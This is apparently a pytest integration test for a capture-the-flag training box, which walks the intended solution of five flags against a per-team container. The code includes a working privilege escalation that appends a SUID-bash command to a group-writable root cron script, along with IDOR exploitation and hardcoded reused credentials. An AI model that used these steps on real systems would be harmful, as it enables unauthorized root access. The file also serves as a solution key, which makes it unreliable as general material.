"""Phase 9 verification: bonus-forgotten-administrator -- rebuilt from
the separate forgotten-administrator-ctf project (a single shared VM
with static flags) into a per-team container with Halcyon's own
CTF_SECRET/HMAC flag scheme, preserving the original's exact puzzle
flow: OSINT -> EXIF metadata -> git history + crypto -> web IDOR +
SSH credential reuse -> cron/group-write privesc -> root-only decrypt
(using Flag 3's own value as the final passphrase, same chain as the
original). This box has no nested_docker dependency at all -- it's a
plain single-host box like noob-orientation-server -- so both backends
work with zero backend-specific code, parametrized below.

Real HTTP, real SSH, a real privilege escalation -- no mocks. Requires
the box image already built (ctf-boxes/bonus-forgotten-administrator:
latest), `sshpass` and `exiftool` and `git` on PATH, and a running
orchestrator reachable at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess
import tarfile
import tempfile
import time

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "bonus-forgotten-administrator"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

ADMIN_SSH_PASSWORD = "N3tOps-Diag#7"  # fixed/narrative -- same for every team, by design


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _ssh_port(inst: dict) -> int:
    for p in inst["ports"]:
        if p["container_port"] == 22:
            return p["host_port"]
    raise AssertionError(f"no SSH port in instance ports: {inst['ports']}")


def _ssh(host: str, port: int, user: str, password: str, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", password, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"{user}@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _scp_to_box(host: str, port: int, user: str, password: str, local_path: str, remote_path: str) -> None:
    result = subprocess.run(
        [
            "sshpass", "-p", password, "scp",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-P", str(port), local_path, f"{user}@{host}:{remote_path}",
        ],
        capture_output=True, text=True, timeout=20,
    )
    assert result.returncode == 0, f"scp failed: {result.stderr}"


def _decrypt_on_box(host: str, port: int, password_for_crypto: str, remote_enc_path: str, as_root: bool = False) -> str:
    """Decrypts a .enc file using the box's OWN vendored flagcrypto.py,
    over SSH as `admin` -- for root-only files, via the same cron
    privesc every real player uses (see _escalate_to_root), not a
    shortcut."""
    inner = f"/opt/venv/bin/python3 /opt/shared/flagcrypto.py decrypt {password_for_crypto!r} {remote_enc_path} -"
    command = f'/tmp/rootbash -p -c "{inner}"' if as_root else inner
    result = _ssh(host, port, "admin", ADMIN_SSH_PASSWORD, command)
    assert result.returncode == 0, f"decrypt of {remote_enc_path} failed: {result.stderr}"
    return result.stdout.strip()


def _escalate_to_root(host: str, port: int) -> None:
    """The box's one intended privesc: /opt/admin-tools/cleanup.sh is
    root:admin, mode 664 -- the `admin` account's own primary group can
    append to it, and root's cron runs it within a minute."""
    append = _ssh(
        host, port, "admin", ADMIN_SSH_PASSWORD,
        "echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/admin-tools/cleanup.sh",
    )
    assert append.returncode == 0, append.stderr
    deadline = time.monotonic() + 90
    while time.monotonic() < deadline:
        time.sleep(3)
        check = _ssh(host, port, "admin", ADMIN_SSH_PASSWORD, "test -u /tmp/rootbash && echo READY")
        if "READY" in check.stdout:
            return
    raise AssertionError("cron privesc never produced a SUID root shell within 90s")


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_five_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host, web_port, ssh_port = inst["entry_host"], inst["entry_port"], _ssh_port(inst)

    # Flag 1: OSINT -- plaintext, buried in ordinary changelog prose.
    project = requests.get(f"http://{host}:{web_port}/project", timeout=10).text
    assert expected_flag(secret, 1) in project
    # Decoy d1a: present, never equal to a real derived flag.
    profile = requests.get(f"http://{host}:{web_port}/profile", timeout=10).text
    assert "FFLAG{old_profile_rev1_55c2}" in profile

    # Flag 2: EXIF metadata on a real photo.
    photo = requests.get(f"http://{host}:{web_port}/materials/metadata/handover_photo.png", timeout=10).content
    with tempfile.NamedTemporaryFile(suffix=".png") as f:
        f.write(photo)
        f.flush()
        exif = subprocess.run(["exiftool", "-Comment", f.name], capture_output=True, text=True, check=True)
    assert expected_flag(secret, 2) in exif.stdout

    # Flag 3: a fresh 4-commit git repo, decoy commit closer to HEAD,
    # real passphrase one commit further back.
    tarball = requests.get(f"http://{host}:{web_port}/materials/stage3/stage3-git-history.tar.gz", timeout=10).content
    with tempfile.TemporaryDirectory() as tmp:
        tar_path = os.path.join(tmp, "stage3.tar.gz")
        with open(tar_path, "wb") as f:
            f.write(tarball)
        with tarfile.open(tar_path) as tf:
            tf.extractall(tmp)
        repo = os.path.join(tmp, "stage3-git-history")

        log = subprocess.run(["git", "log", "--oneline"], cwd=repo, capture_output=True, text=True, check=True)
        commits = log.stdout.strip().splitlines()
        assert len(commits) == 4, f"expected 4 commits, got: {commits}"
        assert "old-wifi-2018" in commits[1], "decoy commit (closer to HEAD) must carry its own password in the message"

        notes = subprocess.run(["git", "show", "HEAD~2:notes.txt"], cwd=repo, capture_output=True, text=True, check=True)
        assert "BlueHarbor-99" in notes.stdout

        enc_bytes = subprocess.run(["git", "show", "HEAD~2:handover_backup.enc"], cwd=repo, capture_output=True, check=True).stdout
        enc_path = os.path.join(tmp, "backup.enc")
        with open(enc_path, "wb") as f:
            f.write(enc_bytes)
        _scp_to_box(host, ssh_port, "admin", ADMIN_SSH_PASSWORD, enc_path, "/tmp/handover_backup.enc")

        decoy_bytes = subprocess.run(["git", "show", "HEAD~1:old_backup_2018.enc"], cwd=repo, capture_output=True, check=True).stdout
        decoy_path = os.path.join(tmp, "decoy.enc")
        with open(decoy_path, "wb") as f:
            f.write(decoy_bytes)
        _scp_to_box(host, ssh_port, "admin", ADMIN_SSH_PASSWORD, decoy_path, "/tmp/decoy3b.enc")

    flag3 = _decrypt_on_box(host, ssh_port, "BlueHarbor-99", "/tmp/handover_backup.enc")
    assert flag3 == expected_flag(secret, 3)
    decoy3b = _decrypt_on_box(host, ssh_port, "old-wifi-2018", "/tmp/decoy3b.enc")
    assert decoy3b == "FFLAG{rotated_out_jan_2019_e2a4}"

    # Stage 4a: web IDOR discloses admin's password (no flag by itself).
    session = requests.Session()
    login = session.post(f"http://{host}:{web_port}/login", data={"username": "john", "password": "Summer2019!"}, timeout=10)
    assert login.status_code == 200
    record = session.get(f"http://{host}:{web_port}/records/2", timeout=10).text
    assert "N3tOps-Diag#7" in record

    # Stage 4b: that web password is ALSO the real Linux admin SSH
    # password (credential reuse) -- decrypt Flag 4.
    notes_ssh = _ssh(host, ssh_port, "admin", ADMIN_SSH_PASSWORD, "cat /home/admin/evidence/decrypt_notes.txt")
    assert notes_ssh.returncode == 0, notes_ssh.stderr
    assert "oldhandoff-rotate-2024" in notes_ssh.stdout
    flag4 = _decrypt_on_box(host, ssh_port, "oldhandoff-rotate-2024", "/home/admin/flags/original_flag_4.enc")
    assert flag4 == expected_flag(secret, 4)
    decoy4a = _ssh(host, ssh_port, "admin", ADMIN_SSH_PASSWORD, "cat /home/admin/evidence/FOUND_A_FLAG.txt")
    assert "FFLAG{ticket_closed_wontfix_19d7}" in decoy4a.stdout

    # Stage 5: the one intended privesc (group-writable root cron
    # script), then the root-only artifact whose passphrase is Flag 3's
    # OWN value -- the one genuinely dynamic password in the whole box.
    _escalate_to_root(host, ssh_port)
    flag5 = _decrypt_on_box(host, ssh_port, flag3, "/root/final_evidence.enc", as_root=True)
    assert flag5 == expected_flag(secret, 5)
    decoy5b = _decrypt_on_box(host, ssh_port, "SnapshotKey-2023", "/root/old_evidence.enc", as_root=True)
    assert decoy5b == "FFLAG{old_root_snapshot_f02e}"


def test_honeypots_and_denied_accounts(box_instance):
    inst, secret, backend = box_instance
    host, ssh_port = inst["entry_host"], _ssh_port(inst)

    honeypot = _ssh(host, ssh_port, "msharma_ops", "0psRunb00k$22", "id", timeout=15)
    assert "Nice try though" in honeypot.stdout, honeypot.stdout

    john_denied = _ssh(host, ssh_port, "john", "whatever", "id")
    assert "Permission denied" in john_denied.stderr

    root_denied = _ssh(host, ssh_port, "root", "whatever", "id")
    assert "Permission denied" in root_denied.stderr


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flags_and_flag5_password_differ(box_instance):
    """The sharpest isolation check here isn't just the flag values --
    it's that Flag 5's own *decryption password* (Flag 3's value) is
    genuinely different per team too, since it's derived fresh from
    each team's own CTF_SECRET."""
    inst_a, secret_a, backend = box_instance
    team_b = _TEAM_ID_BASE + 3
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst_a["entry_host"], inst_a["entry_port"]
        host_b, port_b = inst_b["entry_host"], inst_b["entry_port"]
        flag1_a = requests.get(f"http://{host_a}:{port_a}/project", timeout=10).text
        flag1_b = requests.get(f"http://{host_b}:{port_b}/project", timeout=10).text
        assert expected_flag(secret_a, 1) in flag1_a
        assert expected_flag(secret_b, 1) in flag1_b
        assert expected_flag(secret_a, 1) != expected_flag(secret_b, 1)
    finally:
        requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}").raise_for_status()
